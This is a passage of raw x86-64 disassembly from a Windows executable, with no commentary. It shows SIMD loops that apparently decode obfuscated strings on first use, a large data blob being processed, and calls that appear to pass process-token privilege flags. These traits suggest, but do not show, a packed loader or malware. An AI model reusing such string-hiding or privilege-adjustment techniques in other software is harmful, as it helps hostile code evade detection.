   1400059f1:	66 0f fd 05 97 5f 00 	paddw  0x5f97(%rip),%xmm0        # 0x14000b990
   1400059f8:	00 
   1400059f9:	66 0f db 05 1f 5c 00 	pand   0x5c1f(%rip),%xmm0        # 0x14000b620
   140005a00:	00 
   140005a01:	66 0f 7f 05 c7 e1 2b 	movdqa %xmm0,0x2be1c7(%rip)        # 0x1402c3bd0
   140005a08:	00 
   140005a09:	f3 0f 7e 05 cf e1 2b 	movq   0x2be1cf(%rip),%xmm0        # 0x1402c3be0
   140005a10:	00 
   140005a11:	66 0f fd 05 87 5f 00 	paddw  0x5f87(%rip),%xmm0        # 0x14000b9a0
   140005a18:	00 
   140005a19:	66 0f db 05 3f 5c 00 	pand   0x5c3f(%rip),%xmm0        # 0x14000b660
   140005a20:	00 
   140005a21:	66 0f d6 05 b7 e1 2b 	movq   %xmm0,0x2be1b7(%rip)        # 0x1402c3be0
   140005a28:	00 
   140005a29:	f3 0f 7e 05 b7 e1 2b 	movq   0x2be1b7(%rip),%xmm0        # 0x1402c3be8
   140005a30:	00 
   140005a31:	66 0f fd 05 77 5f 00 	paddw  0x5f77(%rip),%xmm0        # 0x14000b9b0
   140005a38:	00 
   140005a39:	66 0f db 05 4f 5c 00 	pand   0x5c4f(%rip),%xmm0        # 0x14000b690
   140005a40:	00 
   140005a41:	66 0f 7e 05 9f e1 2b 	movd   %xmm0,0x2be19f(%rip)        # 0x1402c3be8
   140005a48:	00 
   140005a49:	c6 05 9c e1 2b 00 00 	movb   $0x0,0x2be19c(%rip)        # 0x1402c3bec
   140005a50:	4c 8d a5 40 0e 00 00 	lea    0xe40(%rbp),%r12
   140005a57:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140005a5e:	4c 89 e1             	mov    %r12,%rcx
   140005a61:	e8 0a 45 00 00       	call   0x140009f70
   140005a66:	48 8d 15 63 e1 2b 00 	lea    0x2be163(%rip),%rdx        # 0x1402c3bd0
   140005a6d:	4c 89 e1             	mov    %r12,%rcx
   140005a70:	e8 eb 44 00 00       	call   0x140009f60
   140005a75:	80 3d 14 d8 2b 00 00 	cmpb   $0x0,0x2bd814(%rip)        # 0x1402c3290
   140005a7c:	0f 84 71 20 00 00    	je     0x140007af3
   140005a82:	80 3d a3 e1 2b 00 00 	cmpb   $0x0,0x2be1a3(%rip)        # 0x1402c3c2c
   140005a89:	0f 84 de 00 00 00    	je     0x140005b6d
   140005a8f:	f3 0f 7e 15 59 e1 2b 	movq   0x2be159(%rip),%xmm2        # 0x1402c3bf0
   140005a96:	00 
   140005a97:	66 0f 6f 05 21 5f 00 	movdqa 0x5f21(%rip),%xmm0        # 0x14000b9c0
   140005a9e:	00 
   140005a9f:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005aa3:	66 0f 6f 0d b5 5b 00 	movdqa 0x5bb5(%rip),%xmm1        # 0x14000b660
   140005aaa:	00 
   140005aab:	66 0f db d1          	pand   %xmm1,%xmm2
   140005aaf:	f3 0f 7e 1d 41 e1 2b 	movq   0x2be141(%rip),%xmm3        # 0x1402c3bf8
   140005ab6:	00 
   140005ab7:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005abb:	66 0f db d9          	pand   %xmm1,%xmm3
   140005abf:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005ac3:	f3 0f 7f 15 25 e1 2b 	movdqu %xmm2,0x2be125(%rip)        # 0x1402c3bf0
   140005aca:	00 
   140005acb:	f3 0f 7e 15 2d e1 2b 	movq   0x2be12d(%rip),%xmm2        # 0x1402c3c00
   140005ad2:	00 
   140005ad3:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005ad7:	66 0f db d1          	pand   %xmm1,%xmm2
   140005adb:	f3 0f 7e 1d 25 e1 2b 	movq   0x2be125(%rip),%xmm3        # 0x1402c3c08
   140005ae2:	00 
   140005ae3:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005ae7:	66 0f db d9          	pand   %xmm1,%xmm3
   140005aeb:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005aef:	f3 0f 7f 15 09 e1 2b 	movdqu %xmm2,0x2be109(%rip)        # 0x1402c3c00
   140005af6:	00 
   140005af7:	f3 0f 7e 15 11 e1 2b 	movq   0x2be111(%rip),%xmm2        # 0x1402c3c10
   140005afe:	00 
   140005aff:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005b03:	66 0f db d1          	pand   %xmm1,%xmm2
   140005b07:	f3 0f 7e 1d 09 e1 2b 	movq   0x2be109(%rip),%xmm3        # 0x1402c3c18
   140005b0e:	00 
   140005b0f:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005b13:	66 0f db d9          	pand   %xmm1,%xmm3
   140005b17:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005b1b:	f3 0f 7f 15 ed e0 2b 	movdqu %xmm2,0x2be0ed(%rip)        # 0x1402c3c10
   140005b22:	00 
   140005b23:	f3 0f 7e 15 f5 e0 2b 	movq   0x2be0f5(%rip),%xmm2        # 0x1402c3c20
   140005b2a:	00 
   140005b2b:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005b2f:	66 0f db d1          	pand   %xmm1,%xmm2
   140005b33:	66 0f d6 15 e5 e0 2b 	movq   %xmm2,0x2be0e5(%rip)        # 0x1402c3c20
   140005b3a:	00 
   140005b3b:	b8 fb 00 00 00       	mov    $0xfb,%eax
   140005b40:	03 05 e2 e0 2b 00    	add    0x2be0e2(%rip),%eax        # 0x1402c3c28
   140005b46:	0f b6 c0             	movzbl %al,%eax
   140005b49:	66 89 05 d8 e0 2b 00 	mov    %ax,0x2be0d8(%rip)        # 0x1402c3c28
   140005b50:	0f b7 05 d3 e0 2b 00 	movzwl 0x2be0d3(%rip),%eax        # 0x1402c3c2a
   140005b57:	05 fb 00 00 00       	add    $0xfb,%eax
   140005b5c:	0f b6 c0             	movzbl %al,%eax
   140005b5f:	66 89 05 c4 e0 2b 00 	mov    %ax,0x2be0c4(%rip)        # 0x1402c3c2a
   140005b66:	c6 05 bf e0 2b 00 00 	movb   $0x0,0x2be0bf(%rip)        # 0x1402c3c2c
   140005b6d:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140005b72:	4c 8d 0d 77 e0 2b 00 	lea    0x2be077(%rip),%r9        # 0x1402c3bf0
   140005b79:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140005b80:	31 c9                	xor    %ecx,%ecx
   140005b82:	4d 89 e0             	mov    %r12,%r8
   140005b85:	e8 66 d2 ff ff       	call   0x140002df0
   140005b8a:	80 3d 00 d7 2b 00 00 	cmpb   $0x0,0x2bd700(%rip)        # 0x1402c3291
   140005b91:	0f 84 8d 1f 00 00    	je     0x140007b24
   140005b97:	80 3d ce e0 2b 00 00 	cmpb   $0x0,0x2be0ce(%rip)        # 0x1402c3c6c
   140005b9e:	0f 84 de 00 00 00    	je     0x140005c82
   140005ba4:	f3 0f 7e 15 84 e0 2b 	movq   0x2be084(%rip),%xmm2        # 0x1402c3c30
   140005bab:	00 
   140005bac:	66 0f 6f 05 2c 5b 00 	movdqa 0x5b2c(%rip),%xmm0        # 0x14000b6e0
   140005bb3:	00 
   140005bb4:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005bb8:	66 0f 6f 0d a0 5a 00 	movdqa 0x5aa0(%rip),%xmm1        # 0x14000b660
   140005bbf:	00 
   140005bc0:	66 0f db d1          	pand   %xmm1,%xmm2
   140005bc4:	f3 0f 7e 1d 6c e0 2b 	movq   0x2be06c(%rip),%xmm3        # 0x1402c3c38
   140005bcb:	00 
   140005bcc:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005bd0:	66 0f db d9          	pand   %xmm1,%xmm3
   140005bd4:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005bd8:	f3 0f 7f 15 50 e0 2b 	movdqu %xmm2,0x2be050(%rip)        # 0x1402c3c30
   140005bdf:	00 
   140005be0:	f3 0f 7e 15 58 e0 2b 	movq   0x2be058(%rip),%xmm2        # 0x1402c3c40
   140005be7:	00 
   140005be8:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005bec:	66 0f db d1          	pand   %xmm1,%xmm2
   140005bf0:	f3 0f 7e 1d 50 e0 2b 	movq   0x2be050(%rip),%xmm3        # 0x1402c3c48
   140005bf7:	00 
   140005bf8:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005bfc:	66 0f db d9          	pand   %xmm1,%xmm3
   140005c00:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005c04:	f3 0f 7f 15 34 e0 2b 	movdqu %xmm2,0x2be034(%rip)        # 0x1402c3c40
   140005c0b:	00 
   140005c0c:	f3 0f 7e 15 3c e0 2b 	movq   0x2be03c(%rip),%xmm2        # 0x1402c3c50
   140005c13:	00 
   140005c14:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005c18:	66 0f db d1          	pand   %xmm1,%xmm2
   140005c1c:	f3 0f 7e 1d 34 e0 2b 	movq   0x2be034(%rip),%xmm3        # 0x1402c3c58
   140005c23:	00 
   140005c24:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005c28:	66 0f db d9          	pand   %xmm1,%xmm3
   140005c2c:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005c30:	f3 0f 7f 15 18 e0 2b 	movdqu %xmm2,0x2be018(%rip)        # 0x1402c3c50
   140005c37:	00 
   140005c38:	f3 0f 7e 15 20 e0 2b 	movq   0x2be020(%rip),%xmm2        # 0x1402c3c60
   140005c3f:	00 
   140005c40:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005c44:	66 0f db d1          	pand   %xmm1,%xmm2
   140005c48:	66 0f d6 15 10 e0 2b 	movq   %xmm2,0x2be010(%rip)        # 0x1402c3c60
   140005c4f:	00 
   140005c50:	b8 c9 00 00 00       	mov    $0xc9,%eax
   140005c55:	03 05 0d e0 2b 00    	add    0x2be00d(%rip),%eax        # 0x1402c3c68
   140005c5b:	0f b6 c0             	movzbl %al,%eax
   140005c5e:	66 89 05 03 e0 2b 00 	mov    %ax,0x2be003(%rip)        # 0x1402c3c68
   140005c65:	0f b7 05 fe df 2b 00 	movzwl 0x2bdffe(%rip),%eax        # 0x1402c3c6a
   140005c6c:	05 c9 00 00 00       	add    $0xc9,%eax
   140005c71:	0f b6 c0             	movzbl %al,%eax
   140005c74:	66 89 05 ef df 2b 00 	mov    %ax,0x2bdfef(%rip)        # 0x1402c3c6a
   140005c7b:	c6 05 ea df 2b 00 00 	movb   $0x0,0x2bdfea(%rip)        # 0x1402c3c6c
   140005c82:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140005c87:	4c 8d 0d a2 df 2b 00 	lea    0x2bdfa2(%rip),%r9        # 0x1402c3c30
   140005c8e:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140005c95:	31 c9                	xor    %ecx,%ecx
   140005c97:	4d 89 e0             	mov    %r12,%r8
   140005c9a:	e8 51 d1 ff ff       	call   0x140002df0
   140005c9f:	80 3d ec d5 2b 00 00 	cmpb   $0x0,0x2bd5ec(%rip)        # 0x1402c3292
   140005ca6:	0f 84 a9 1e 00 00    	je     0x140007b55
   140005cac:	80 3d f5 df 2b 00 00 	cmpb   $0x0,0x2bdff5(%rip)        # 0x1402c3ca8
   140005cb3:	0f 84 b3 00 00 00    	je     0x140005d6c
   140005cb9:	f3 0f 7e 15 af df 2b 	movq   0x2bdfaf(%rip),%xmm2        # 0x1402c3c70
   140005cc0:	00 
   140005cc1:	66 0f 6f 05 07 5d 00 	movdqa 0x5d07(%rip),%xmm0        # 0x14000b9d0
   140005cc8:	00 
   140005cc9:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005ccd:	66 0f 6f 0d 8b 59 00 	movdqa 0x598b(%rip),%xmm1        # 0x14000b660
   140005cd4:	00 
   140005cd5:	66 0f db d1          	pand   %xmm1,%xmm2
   140005cd9:	f3 0f 7e 1d 97 df 2b 	movq   0x2bdf97(%rip),%xmm3        # 0x1402c3c78
   140005ce0:	00 
   140005ce1:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005ce5:	66 0f db d9          	pand   %xmm1,%xmm3
   140005ce9:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005ced:	f3 0f 7f 15 7b df 2b 	movdqu %xmm2,0x2bdf7b(%rip)        # 0x1402c3c70
   140005cf4:	00 
   140005cf5:	f3 0f 7e 15 83 df 2b 	movq   0x2bdf83(%rip),%xmm2        # 0x1402c3c80
   140005cfc:	00 
   140005cfd:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005d01:	66 0f db d1          	pand   %xmm1,%xmm2
   140005d05:	f3 0f 7e 1d 7b df 2b 	movq   0x2bdf7b(%rip),%xmm3        # 0x1402c3c88
   140005d0c:	00 
   140005d0d:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005d11:	66 0f db d9          	pand   %xmm1,%xmm3
   140005d15:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005d19:	f3 0f 7f 15 5f df 2b 	movdqu %xmm2,0x2bdf5f(%rip)        # 0x1402c3c80
   140005d20:	00 
   140005d21:	f3 0f 7e 15 67 df 2b 	movq   0x2bdf67(%rip),%xmm2        # 0x1402c3c90
   140005d28:	00 
   140005d29:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005d2d:	66 0f db d1          	pand   %xmm1,%xmm2
   140005d31:	f3 0f 7e 1d 5f df 2b 	movq   0x2bdf5f(%rip),%xmm3        # 0x1402c3c98
   140005d38:	00 
   140005d39:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005d3d:	66 0f db d9          	pand   %xmm1,%xmm3
   140005d41:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005d45:	f3 0f 7f 15 43 df 2b 	movdqu %xmm2,0x2bdf43(%rip)        # 0x1402c3c90
   140005d4c:	00 
   140005d4d:	f3 0f 7e 15 4b df 2b 	movq   0x2bdf4b(%rip),%xmm2        # 0x1402c3ca0
   140005d54:	00 
   140005d55:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005d59:	66 0f db d1          	pand   %xmm1,%xmm2
   140005d5d:	66 0f d6 15 3b df 2b 	movq   %xmm2,0x2bdf3b(%rip)        # 0x1402c3ca0
   140005d64:	00 
   140005d65:	c6 05 3c df 2b 00 00 	movb   $0x0,0x2bdf3c(%rip)        # 0x1402c3ca8
   140005d6c:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140005d71:	4c 8d 0d f8 de 2b 00 	lea    0x2bdef8(%rip),%r9        # 0x1402c3c70
   140005d78:	4c 8d bd 60 12 00 00 	lea    0x1260(%rbp),%r15
   140005d7f:	31 c9                	xor    %ecx,%ecx
   140005d81:	4c 89 fa             	mov    %r15,%rdx
   140005d84:	4d 89 e0             	mov    %r12,%r8
   140005d87:	e8 64 d0 ff ff       	call   0x140002df0
   140005d8c:	80 3d 00 d5 2b 00 00 	cmpb   $0x0,0x2bd500(%rip)        # 0x1402c3293
   140005d93:	0f 84 ed 1d 00 00    	je     0x140007b86
   140005d99:	80 3d 48 df 2b 00 00 	cmpb   $0x0,0x2bdf48(%rip)        # 0x1402c3ce8
   140005da0:	0f 84 b3 00 00 00    	je     0x140005e59
   140005da6:	f3 0f 7e 15 02 df 2b 	movq   0x2bdf02(%rip),%xmm2        # 0x1402c3cb0
   140005dad:	00 
   140005dae:	66 0f 6f 05 2a 5c 00 	movdqa 0x5c2a(%rip),%xmm0        # 0x14000b9e0
   140005db5:	00 
   140005db6:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005dba:	66 0f 6f 0d 9e 58 00 	movdqa 0x589e(%rip),%xmm1        # 0x14000b660
   140005dc1:	00 
   140005dc2:	66 0f db d1          	pand   %xmm1,%xmm2
   140005dc6:	f3 0f 7e 1d ea de 2b 	movq   0x2bdeea(%rip),%xmm3        # 0x1402c3cb8
   140005dcd:	00 
   140005dce:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005dd2:	66 0f db d9          	pand   %xmm1,%xmm3
   140005dd6:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005dda:	f3 0f 7f 15 ce de 2b 	movdqu %xmm2,0x2bdece(%rip)        # 0x1402c3cb0
   140005de1:	00 
   140005de2:	f3 0f 7e 15 d6 de 2b 	movq   0x2bded6(%rip),%xmm2        # 0x1402c3cc0
   140005de9:	00 
   140005dea:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005dee:	66 0f db d1          	pand   %xmm1,%xmm2
   140005df2:	f3 0f 7e 1d ce de 2b 	movq   0x2bdece(%rip),%xmm3        # 0x1402c3cc8
   140005df9:	00 
   140005dfa:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005dfe:	66 0f db d9          	pand   %xmm1,%xmm3
   140005e02:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005e06:	f3 0f 7f 15 b2 de 2b 	movdqu %xmm2,0x2bdeb2(%rip)        # 0x1402c3cc0
   140005e0d:	00 
   140005e0e:	f3 0f 7e 15 ba de 2b 	movq   0x2bdeba(%rip),%xmm2        # 0x1402c3cd0
   140005e15:	00 
   140005e16:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005e1a:	66 0f db d1          	pand   %xmm1,%xmm2
   140005e1e:	f3 0f 7e 1d b2 de 2b 	movq   0x2bdeb2(%rip),%xmm3        # 0x1402c3cd8
   140005e25:	00 
   140005e26:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005e2a:	66 0f db d9          	pand   %xmm1,%xmm3
   140005e2e:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005e32:	f3 0f 7f 15 96 de 2b 	movdqu %xmm2,0x2bde96(%rip)        # 0x1402c3cd0
   140005e39:	00 
   140005e3a:	f3 0f 7e 15 9e de 2b 	movq   0x2bde9e(%rip),%xmm2        # 0x1402c3ce0
   140005e41:	00 
   140005e42:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005e46:	66 0f db d1          	pand   %xmm1,%xmm2
   140005e4a:	66 0f d6 15 8e de 2b 	movq   %xmm2,0x2bde8e(%rip)        # 0x1402c3ce0
   140005e51:	00 
   140005e52:	c6 05 8f de 2b 00 00 	movb   $0x0,0x2bde8f(%rip)        # 0x1402c3ce8
   140005e59:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140005e5e:	4c 8d 0d 4b de 2b 00 	lea    0x2bde4b(%rip),%r9        # 0x1402c3cb0
   140005e65:	31 c9                	xor    %ecx,%ecx
   140005e67:	4c 89 fa             	mov    %r15,%rdx
   140005e6a:	4d 89 e0             	mov    %r12,%r8
   140005e6d:	e8 7e cf ff ff       	call   0x140002df0
   140005e72:	48 8d 0d 57 88 28 00 	lea    0x288857(%rip),%rcx        # 0x14028e6d0
   140005e79:	4c 8d ad 10 17 00 00 	lea    0x1710(%rbp),%r13
   140005e80:	ba ac 4a 03 00       	mov    $0x34aac,%edx
   140005e85:	4d 89 e8             	mov    %r13,%r8
   140005e88:	e8 e3 d0 ff ff       	call   0x140002f70
   140005e8d:	48 89 c3             	mov    %rax,%rbx
   140005e90:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140005e95:	4c 8d a5 00 06 00 00 	lea    0x600(%rbp),%r12
   140005e9c:	4c 89 e1             	mov    %r12,%rcx
   140005e9f:	4c 89 e2             	mov    %r12,%rdx
   140005ea2:	45 31 c0             	xor    %r8d,%r8d
   140005ea5:	49 89 c1             	mov    %rax,%r9
   140005ea8:	e8 03 db ff ff       	call   0x1400039b0
   140005ead:	49 89 c6             	mov    %rax,%r14
   140005eb0:	48 8b 85 10 17 00 00 	mov    0x1710(%rbp),%rax
   140005eb7:	48 89 85 50 10 00 00 	mov    %rax,0x1050(%rbp)
   140005ebe:	48 89 9d 70 14 00 00 	mov    %rbx,0x1470(%rbp)
   140005ec5:	48 8d 95 70 14 00 00 	lea    0x1470(%rbp),%rdx
   140005ecc:	4c 8d 85 50 10 00 00 	lea    0x1050(%rbp),%r8
   140005ed3:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140005eda:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140005ee0:	e8 e2 b5 ff ff       	call   0x1400014c7
   140005ee5:	49 83 fe ff          	cmp    $0xffffffffffffffff,%r14
   140005ee9:	74 08                	je     0x140005ef3
   140005eeb:	4c 89 f1             	mov    %r14,%rcx
   140005eee:	e8 6b b5 ff ff       	call   0x14000145e
   140005ef3:	f3 0f 6f 05 e1 5c 00 	movdqu 0x5ce1(%rip),%xmm0        # 0x14000bbdc
   140005efa:	00 
   140005efb:	66 0f 7f 85 80 16 00 	movdqa %xmm0,0x1680(%rbp)
   140005f02:	00 
   140005f03:	48 c7 85 f8 16 00 00 	movq   $0x0,0x16f8(%rbp)
   140005f0a:	00 00 00 00 
   140005f0e:	4c 8d 85 f8 16 00 00 	lea    0x16f8(%rbp),%r8
   140005f15:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140005f1c:	ba 28 00 00 00       	mov    $0x28,%edx
   140005f21:	e8 dd b5 ff ff       	call   0x140001503
   140005f26:	85 c0                	test   %eax,%eax
   140005f28:	78 3e                	js     0x140005f68
   140005f2a:	48 8b 8d f8 16 00 00 	mov    0x16f8(%rbp),%rcx
   140005f31:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140005f35:	f3 0f 7f 44 24 20    	movdqu %xmm0,0x20(%rsp)
   140005f3b:	4c 8d 85 80 16 00 00 	lea    0x1680(%rbp),%r8
   140005f42:	31 d2                	xor    %edx,%edx
   140005f44:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   140005f4a:	e8 ff b5 ff ff       	call   0x14000154e
   140005f4f:	85 c0                	test   %eax,%eax
   140005f51:	0f 99 c0             	setns  %al
   140005f54:	89 85 34 17 00 00    	mov    %eax,0x1734(%rbp)
   140005f5a:	48 8b 8d f8 16 00 00 	mov    0x16f8(%rbp),%rcx
   140005f61:	e8 f8 b4 ff ff       	call   0x14000145e
   140005f66:	eb 0a                	jmp    0x140005f72
   140005f68:	c7 85 34 17 00 00 00 	movl   $0x0,0x1734(%rbp)
   140005f6f:	00 00 00 
   140005f72:	48 c7 85 00 17 00 00 	movq   $0x0,0x1700(%rbp)
   140005f79:	00 00 00 00 
   140005f7d:	80 3d e6 d2 2b 00 00 	cmpb   $0x0,0x2bd2e6(%rip)        # 0x1402c326a
   140005f84:	0f 84 2d 1c 00 00    	je     0x140007bb7
   140005f8a:	80 3d b9 d3 2b 00 00 	cmpb   $0x0,0x2bd3b9(%rip)        # 0x1402c334a
   140005f91:	0f 84 1c 01 00 00    	je     0x1400060b3
   140005f97:	66 0f 6f 05 f1 57 00 	movdqa 0x57f1(%rip),%xmm0        # 0x14000b790
   140005f9e:	00 
   140005f9f:	66 0f 6f 15 29 d3 2b 	movdqa 0x2bd329(%rip),%xmm2        # 0x1402c32d0
   140005fa6:	00 
   140005fa7:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005fab:	66 0f 6f 0d 6d 56 00 	movdqa 0x566d(%rip),%xmm1        # 0x14000b620
   140005fb2:	00 
   140005fb3:	66 0f db d1          	pand   %xmm1,%xmm2
   140005fb7:	66 0f 7f 15 11 d3 2b 	movdqa %xmm2,0x2bd311(%rip)        # 0x1402c32d0
   140005fbe:	00 
   140005fbf:	66 0f 6f 15 19 d3 2b 	movdqa 0x2bd319(%rip),%xmm2        # 0x1402c32e0
   140005fc6:	00 
   140005fc7:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005fcb:	66 0f db d1          	pand   %xmm1,%xmm2
   140005fcf:	66 0f 7f 15 09 d3 2b 	movdqa %xmm2,0x2bd309(%rip)        # 0x1402c32e0
   140005fd6:	00 
   140005fd7:	66 0f 6f 15 11 d3 2b 	movdqa 0x2bd311(%rip),%xmm2        # 0x1402c32f0
   140005fde:	00 
   140005fdf:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005fe3:	66 0f db d1          	pand   %xmm1,%xmm2
   140005fe7:	66 0f 7f 15 01 d3 2b 	movdqa %xmm2,0x2bd301(%rip)        # 0x1402c32f0
   140005fee:	00 
   140005fef:	66 0f 6f 15 09 d3 2b 	movdqa 0x2bd309(%rip),%xmm2        # 0x1402c3300
   140005ff6:	00 
   140005ff7:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005ffb:	66 0f db d1          	pand   %xmm1,%xmm2
   140005fff:	66 0f 7f 15 f9 d2 2b 	movdqa %xmm2,0x2bd2f9(%rip)        # 0x1402c3300
   140006006:	00 
   140006007:	66 0f 6f 15 01 d3 2b 	movdqa 0x2bd301(%rip),%xmm2        # 0x1402c3310
   14000600e:	00 
   14000600f:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140006013:	66 0f db d1          	pand   %xmm1,%xmm2
   140006017:	66 0f 7f 15 f1 d2 2b 	movdqa %xmm2,0x2bd2f1(%rip)        # 0x1402c3310
   14000601e:	00 
   14000601f:	66 0f 6f 15 f9 d2 2b 	movdqa 0x2bd2f9(%rip),%xmm2        # 0x1402c3320
   140006026:	00 
   140006027:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000602b:	66 0f db d1          	pand   %xmm1,%xmm2
   14000602f:	66 0f 7f 15 e9 d2 2b 	movdqa %xmm2,0x2bd2e9(%rip)        # 0x1402c3320
   140006036:	00 
   140006037:	66 0f fd 05 f1 d2 2b 	paddw  0x2bd2f1(%rip),%xmm0        # 0x1402c3330
   14000603e:	00 
   14000603f:	66 0f db c1          	pand   %xmm1,%xmm0
   140006043:	66 0f 7f 05 e5 d2 2b 	movdqa %xmm0,0x2bd2e5(%rip)        # 0x1402c3330
   14000604a:	00 
   14000604b:	8b 05 ef d2 2b 00    	mov    0x2bd2ef(%rip),%eax        # 0x1402c3340
   140006051:	83 c0 0b             	add    $0xb,%eax
   140006054:	0f b6 c0             	movzbl %al,%eax
   140006057:	66 89 05 e2 d2 2b 00 	mov    %ax,0x2bd2e2(%rip)        # 0x1402c3340
   14000605e:	0f b7 05 dd d2 2b 00 	movzwl 0x2bd2dd(%rip),%eax        # 0x1402c3342
   140006065:	83 c0 0b             	add    $0xb,%eax
   140006068:	0f b6 c0             	movzbl %al,%eax
   14000606b:	66 89 05 d0 d2 2b 00 	mov    %ax,0x2bd2d0(%rip)        # 0x1402c3342
   140006072:	8b 05 cc d2 2b 00    	mov    0x2bd2cc(%rip),%eax        # 0x1402c3344
   140006078:	83 c0 0b             	add    $0xb,%eax
   14000607b:	0f b6 c0             	movzbl %al,%eax
   14000607e:	66 89 05 bf d2 2b 00 	mov    %ax,0x2bd2bf(%rip)        # 0x1402c3344
   140006085:	0f b7 05 ba d2 2b 00 	movzwl 0x2bd2ba(%rip),%eax        # 0x1402c3346
   14000608c:	83 c0 0b             	add    $0xb,%eax
   14000608f:	0f b6 c0             	movzbl %al,%eax
   140006092:	66 89 05 ad d2 2b 00 	mov    %ax,0x2bd2ad(%rip)        # 0x1402c3346
   140006099:	8b 05 a9 d2 2b 00    	mov    0x2bd2a9(%rip),%eax        # 0x1402c3348
   14000609f:	83 c0 0b             	add    $0xb,%eax
   1400060a2:	0f b6 c0             	movzbl %al,%eax
   1400060a5:	66 89 05 9c d2 2b 00 	mov    %ax,0x2bd29c(%rip)        # 0x1402c3348
   1400060ac:	c6 05 97 d2 2b 00 00 	movb   $0x0,0x2bd297(%rip)        # 0x1402c334a
   1400060b3:	48 c7 85 10 17 00 00 	movq   $0x0,0x1710(%rbp)
   1400060ba:	00 00 00 00 
   1400060be:	48 8d 1d 0b d2 2b 00 	lea    0x2bd20b(%rip),%rbx        # 0x1402c32d0
   1400060c5:	48 89 d9             	mov    %rbx,%rcx
   1400060c8:	e8 b3 3e 00 00       	call   0x140009f80
   1400060cd:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   1400060d4:	01 c0                	add    %eax,%eax
   1400060d6:	66 89 8d 12 17 00 00 	mov    %cx,0x1712(%rbp)
   1400060dd:	66 89 85 10 17 00 00 	mov    %ax,0x1710(%rbp)
   1400060e4:	48 89 9d 18 17 00 00 	mov    %rbx,0x1718(%rbp)
   1400060eb:	66 0f ef c0          	pxor   %xmm0,%xmm0
   1400060ef:	66 0f 7f 85 70 14 00 	movdqa %xmm0,0x1470(%rbp)
   1400060f6:	00 
   1400060f7:	66 0f 7f 85 80 14 00 	movdqa %xmm0,0x1480(%rbp)
   1400060fe:	00 
   1400060ff:	c7 85 70 14 00 00 30 	movl   $0x30,0x1470(%rbp)
   140006106:	00 00 00 
   140006109:	c7 85 88 14 00 00 40 	movl   $0x40,0x1488(%rbp)
   140006110:	00 00 00 
   140006113:	4c 89 ad 80 14 00 00 	mov    %r13,0x1480(%rbp)
   14000611a:	66 0f 7f 85 90 14 00 	movdqa %xmm0,0x1490(%rbp)
   140006121:	00 
   140006122:	48 8d 8d 00 17 00 00 	lea    0x1700(%rbp),%rcx
   140006129:	4c 8d 85 70 14 00 00 	lea    0x1470(%rbp),%r8
   140006130:	ba 01 00 00 00       	mov    $0x1,%edx
   140006135:	e8 41 b4 ff ff       	call   0x14000157b
   14000613a:	85 c0                	test   %eax,%eax
   14000613c:	0f 88 12 01 00 00    	js     0x140006254
   140006142:	48 8d 8d 50 10 00 00 	lea    0x1050(%rbp),%rcx
   140006149:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   14000614f:	31 d2                	xor    %edx,%edx
   140006151:	e8 0a 3f 00 00       	call   0x14000a060
   140006156:	80 3d 0e d1 2b 00 00 	cmpb   $0x0,0x2bd10e(%rip)        # 0x1402c326b
